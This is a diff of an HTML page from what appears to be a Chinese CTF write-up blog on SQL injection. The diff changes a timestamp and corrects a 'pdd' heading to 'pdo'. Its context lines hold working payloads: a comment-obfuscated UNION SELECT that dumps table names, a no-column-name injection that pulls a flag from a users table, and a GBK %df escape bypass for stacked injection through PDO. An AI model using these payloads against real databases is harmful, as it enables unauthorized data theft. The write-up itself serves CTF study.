@@ -100,7 +100,7 @@
           <!-- Date -->
           <span class="date-time info">On
             <span class="date">2020-02-20</span>
-            <span class="time">09:50:05</span>
+            <span class="time">22:05:00</span>
           </span>
           
         </div>
@@ -114,7 +114,7 @@
 <pre><code class="hljs undefined"><span class="hljs-number">-1</span>'union<span class="hljs-comment">/**/</span>select<span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,(select<span class="hljs-comment">/**/</span>group_concat(table_name)<span class="hljs-comment">/**/</span>from<span class="hljs-comment">/**/</span>mysql.innodb_table_stats),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,'<span class="hljs-number">22</span></code></pre>
 
 <p>接下来介绍一个无列名注入<br> <code>select</code>4<code>from (select 1,2,3,4,5,6 union select * from users)a;</code><br> 会把第四列的数据拿出来,但是这题中的反引号过滤了<br>用下列方法<br><code>select b from (select 1,2,3 as b,4,5 union select * from users)a;</code><br>但我们不知道是第四列所以要提前fuzzing一下<br><code>select b from (select 1,2 as b,3,4,5 union select * from users)a;</code><br>查第三字段,最后fuzzing到3的时候查到flag</p>
-<h1 id="gbk-pdd-sql注入"><a href="#gbk-pdd-sql注入" class="headerlink" title="gbk+pdd sql注入"></a>gbk+pdd sql注入</h1><p>PDO默认是允许多句执行和模拟预编译的,在参数可控的情况下, 会导致堆叠注入。<br>在预编译的情况下,单引号和一些敏感字符会被转义,我们知道在gbk编码下通过%df可以绕过转义<br>pdd原理执行编译<br>Set @x=0x31<br>Prepare a from “ select balabala from table1 where 1=? ”<br>Execute a using @x<br>如下题</p>
+<h1 id="gbk-pdo-sql注入"><a href="#gbk-pdo-sql注入" class="headerlink" title="gbk+pdo sql注入"></a>gbk+pdo sql注入</h1><p>PDO默认是允许多句执行和模拟预编译的,在参数可控的情况下, 会导致堆叠注入。<br>在预编译的情况下,单引号和一些敏感字符会被转义,我们知道在gbk编码下通过%df可以绕过转义<br>pdd原理执行编译<br>Set @x=0x31<br>Prepare a from “ select balabala from table1 where 1=? ”<br>Execute a using @x<br>如下题</p>
 <pre><code class="hljs undefined"><span class="php"><span class="hljs-meta">&lt;?php</span> 
     <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span><span class="hljs-params">($str)</span>
     </span>&#123;
